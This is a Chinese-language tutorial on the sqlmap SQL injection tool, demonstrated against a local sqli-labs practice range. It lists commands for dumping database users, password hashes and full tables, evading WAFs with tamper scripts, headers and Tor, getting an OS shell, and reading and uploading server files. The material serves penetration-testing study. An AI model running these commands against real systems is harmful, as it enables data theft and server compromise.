# sql注入--sqlmap使用

## 工具介绍

一款自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。

实例：sqli-labs靶场

采用五种独特的SQL注入技术，分别是：

- 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
- 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
- 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
- 4、联合查询注入，可以使用union的情况下的注入。
- 5、堆查询注入，可以同时执行多条语句的执行时的注入。



## 常用指令

> sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"   #探测该url是否存在漏洞

> sqlmap -r http.txt                  #http.txt是我们抓取的http的请求包，在请求包中在注入位置加*让工具在此处进行注入
>
> sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
>
> sqlmap -u "http://www.xx.com/username/admin**"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个" * "来让sqlmap对其注入



 sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1"

   - --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
   -  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
   -  --users      #查看数据库的所有用户
   -  --passwords  #查看数据库用户名的密码
     - 有时候使用 --passwords 不能获取到密码，则可以试下
     -  -D mysql -T user -C host,user,password --dump  当MySQL< 5.7时
     -  -D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时

- --current-user  #查看数据库当前的用户
-  --is-dba    #判断当前用户是否有管理员权限
-  --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候
- --dbs        #爆出所有的数据库
- --tables     #爆出所有的数据表
-  --columns    #爆出数据库中所有的列
-  --current-db #查看当前的数据库

--tables  #爆出指定数据库中的所有的表

--columns #爆出指定数据库中指定表中的所有的列

--dump  #爆出指定数据库中指定表中的指定的列的所有数据

--start 1 --stop 100 #前100条数据

-D  #指定数据库

-T  #指定表名

-C  #指定列名，多个列名用逗号（,）隔开

- -D security  #爆出数据库security中的所有的表
- -D security -T users --columns #爆出security数据库中users表中的所有的列
- -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
- -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据
- -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
- -D security --dump-all   #爆出数据库security中的所有数据
- --dump-all  #爆出该数据库中的所有数据



-  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
- --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
- --sql-shell  #执行指定的sql语句
- --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
-  --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上
-  --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
- --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
-  --dbms="MySQL"     #指定其数据库为mysql 
  其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, sqli-labste, Sybase, Vertica, eXtremeDB
- --random-agent   #使用任意的User-Agent爆破
- --proxy="http://127.0.0.1:8080"    #指定代理
  当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl
-  --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
  支持的探测方式如下：
  　　B: Boolean-based blind SQL injection（布尔型注入）
  　　E: Error-based SQL injection（报错型注入）
  　　U: UNION query SQL injection（可联合查询注入）
  　　S: Stacked queries SQL injection（可多语句查询注入）
  　　T: Time-based blind SQL injection（基于时间延迟注入）
- --os-shell   #知道网站的账号密码直接连接
- -v3                   #输出详细度  最大值5 会显示请求包和回复包
- --threads 5           #指定线程数
- --fresh-queries       #清除缓存
- --flush-session       #清空会话，重构注入 
- --batch               #对所有的交互式的都是默认的
- --random-agent        #任意的http头
- --tamper base64encode            #对提交的数据进行base64编码
- --referer http://www.baidu.com   #伪造referer字段
- --keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数



## 探测目标网站是否存在注入

1、不需要登陆的站点

sqlmap -u  "http://127.0.0.1/sqli-labs/Less-1/?id=1"  #探测该url是否存在漏洞

我们可以看到sqlmap和我们存在交互，大家需要根据工具提示选择不同的扫描方式


sqlmap会告知我们目标网站存在的注入类型、脚本语言及版本、数据库类型及版本、中间件等相关信息。

扫描最后会告知我们探测数据的保存路径

2、需要登陆的站点

sqlmap -u  "http://127.0.0.1/sqli-labs/Less-1/?id=1"   --cookie="抓取的cookie"  #探测该url是否存在漏洞

3、需要Post提交数据的url

sqlmap -u "http://127.0.0.1/sqli-labs/Less-11/?id=1" --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入

查询数据库users

sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --users

查询数据库passwords

sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --passwords

当我们跑密码的时候，sqlmap和我们会有两条左右交互

第一处：询问我们是否保存hash值 Y/N

第二处：询问我们是否对hash值进行爆破 Y/N/Q

第三处：询问我们是否要使用通用密码后缀？ Y/N

查询数据库当前用户

sqlmap -u "http://127.0.0.1/sqli-lasb/Less-1/?id=1" --current-user  #查看数据库当前的用户

查询当前数据库用户是否是管理员权限

sqlmap -u "http://127.0.0.1/sqli/Less-1/?id=1" --is-dba  #判断当前用户是否有管理员权限

列出数据库的管理员用户名

sqlmap -u "http://127.0.0.1/sqli/Less-1/?id=1" --roles

查询所有数据库

sqlmap -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs

查询当前数据库

sqlmap -u "http://127.0.0.1/sqli/Less-1/?id=1" --current-db

输出指定数据库名字下的全部表

sqlmap -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables

输出指定数据名下指定表下的全部列

sqlmap -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --columns

输出指定数据库指定列指定字段下的全部数据

sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users -C password --dump

-all系列

1、输出该数据库中全部数据

sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --dump-all

2、输出指定数据库中的全部数据

sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security --dump-all

3、输出指定数据库指定表中的全部数据

sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T user --dump-all

## 高级用法

### 绕过WAF

原理：只用–tamper对参数进行修改来绕过waf，官方提供的绝大部分脚本是用正则模块替换攻击载荷字符编码的方式来绕过waf的检测规则。

常用指令：

> --identify-waf   检测是否有WAF
>
> 
>
> #使用参数进行绕过
>
> --random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候
>
> --time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时
>
> --hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
>
> --proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过
>
> --ignore-proxy    禁止使用系统的代理，直接连接进行注入
>
> --flush-session   清空会话，重构注入
>
> --hex 或者 --no-cast     进行字符码转换
>
> --mobile          对移动端的服务器进行注入
>
> --tor             匿名注入



sqlmap为我们准备了绕过waf的脚本，在sqlmap文件夹tamper文件夹下

使用情况如下：

> 使用方法--tamper xxx.py
>
> apostrophemask.py用UTF-8全角字符替换单引号字符
>
> apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
>
> appendnullbyte.py在payload末尾添加空字符编码
>
> base64encode.py 对给定的payload全部字符使用Base64编码
>
> between.py分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
>
> bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
>
> chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
>
> charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
>
> charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
>
> concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
>
> equaltolike.py 用“LIKE”运算符替换全部等于号“=”
>
> greatest.py 用“GREATEST”函数替换大于号“>”
>
> halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
>
> ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
>
> lowercase.py 用小写值替换每个关键字字符
>
> modsecurityversioned.py 用注释包围完整的查询
>
> modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
>
> multiplespaces.py 在SQL关键字周围添加多个空格
>
> nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
>
> overlongutf8.py 转换给定的payload当中的所有字符
>
> percentage.py 在每个字符之前添加一个百分号
>
> randomcase.py 随机转换每个关键字字符的大小写
>
> randomcomments.py 向SQL关键字中插入随机注释
>
> securesphere.py 添加经过特殊构造的字符串
>
> sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
>
> space2comment.py 用“/**/”替换空格符
>
> space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符
>
> space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
>
> space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
>
> space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
>
> space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
>
> space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
>
> space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符
>
> space2plus.py 用加号“+”替换空格符
>
> space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
>
> unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
>
> unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
>
> varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
>
> versionedkeywords.py 用MySQL注释包围每个非函数关键字
>
> versionedmorekeywords.py 用MySQL注释包围每个关键字
>
> xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF

### -level/-risk

Sqlmap一共有5个探测等级,默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多 ，会自动破解出cookie、XFF等头部注入。当然,等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试,HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。 在不确定哪个参数为注入点时，为为保证准确.性,建议设置level为5

Sqlmap一共有3个危险等级, 也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思， 在不确定的情况下，建议设置为3级，–risk=3

工具使用payload目录

sqlmap\data\xml\payloads（windows）

伪造Http Referer头部

sqlmap可以在请求中伪造http请求头中的referer，当-level大于等于3时，会进行referer注入

eg: referer http://www.topreverse.cn

执行指定的SQL语句

sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --sql-shell  #执行指定的sql语句

![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/258c2229a43edde35260ff029ef1126c_MD5.png)

### 执行OS系统命令

当且仅当数据库是mysql、postgresql、sql server时可以执行。

当数据库是mysql时，需要满足3个条件：

1. root权限
2. 已经知道目标站点的绝对路径
3. secure_file_priv的参数值时空（未修改前是NULL）

sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --os-shell  #执行--os-shell命令

![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/0389ad0c6da23e1034b8c650a4948d7f_MD5.png)

过程中sqlmap会向指定路径传入两个文件，tmpblwkd.php（木马文件）和tmpueqch.php。退出时输入q和x才可以删除传入的文件。

### 读取服务器文件

前提：数据库是：mysql、postgresql和sql server

sqlmap -u "http://127.0.0.1/sqli-labs/Less-4/?id=1" --file-read "c:/topreverse.txt" #读取目标服务器C盘下的test.txt文件
### 上传文件到数据库服务器

前提：数据库是mysql、postgre sql、sql server

sqlmap.py -u http://127.0.0.1/sqli-labs/Less-2/?id=1 --file-write C:\Users\system32\Desktop\text.php --file-dest "C:\phpStudy\PHPTutorial\WWW\test.php"  #将本地的text.php文件上传到目标服务器test.php

sqlmap自身上传完成之后会进行验证，读取文件大小进行对比。
